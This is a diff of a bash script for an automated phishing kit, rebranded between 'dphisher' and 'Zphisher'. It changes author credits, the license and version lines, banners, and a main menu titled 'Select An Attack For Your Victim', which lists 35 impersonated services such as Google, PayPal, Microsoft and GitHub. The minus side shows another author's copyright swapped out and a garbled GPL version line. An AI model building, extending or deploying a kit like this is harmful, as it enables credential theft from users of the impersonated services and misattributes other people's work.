@@ -1,13 +1,13 @@
 #!/bin/bash
 
-##   dphisher 	: 	Automated Phishing Tool
-##   Author 	: 	Maddox Ai
+##   Zphisher 	: 	Automated Phishing Tool
+##   Author 	: 	DHANUSH S PATEL 
 ##   Version 	: 	0.1
 ##   Github 	: 	https://github.com/dhanushspatel/dphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 1, 6 July 2025
+##                    Version 3, 29 June 2007
 ##
 ##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 ##    Everyone is permitted to copy and distribute verbatim copies
@@ -76,7 +76,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  dhanushspatel (https://github.com/dhanushspatel)
+##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
 ##
 
 ##   THANKS TO :
@@ -90,7 +90,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="0.1"
+__version__="2.3.5"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -176,13 +176,13 @@ check_update(){
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
-		if [[ -e ".dphisher.tar.gz" ]]; then
-			tar -xf .dphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".zphisher.tar.gz" ]]; then
+			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
 			rm -f .zphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run dphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -203,19 +203,18 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ██████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
-		${ORANGE} ██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
-		${ORANGE} ██║  ██║█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
-		${ORANGE} ██║  ██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
-		${ORANGE} ██████╔╝      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
-		${ORANGE} ╚═════╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+		${GREEN}
+		${GREEN} ██████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+		${GREEN} ██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
+		${GREEN} ██║  ██║█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
+		${GREEN} ██║  ██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
+		${GREEN} ██████╔╝      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
+		${GREEN} ╚═════╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 										              ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by dhanushspatel (maddox.ai)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Dhanush S Patel (Maddox.Ai)${WHITE}
 	EOF
 }
-
 
 ## Small Banner
 banner_small() {
@@ -228,8 +227,6 @@ banner_small() {
 		${WHITE} ${__version__}
 	EOF
 }
-
-
 
 ## Dependencies
 dependencies() {
@@ -353,9 +350,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}dhanushspatel ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/dhanushspatel
-		${GREEN} Social   ${RED}:  ${CYAN}https://instagram.com/dhanuxh__
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -364,7 +361,9 @@ about() {
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  Maddox Ai, https.dhanuxh
+		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -741,9 +740,19 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     
-		
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
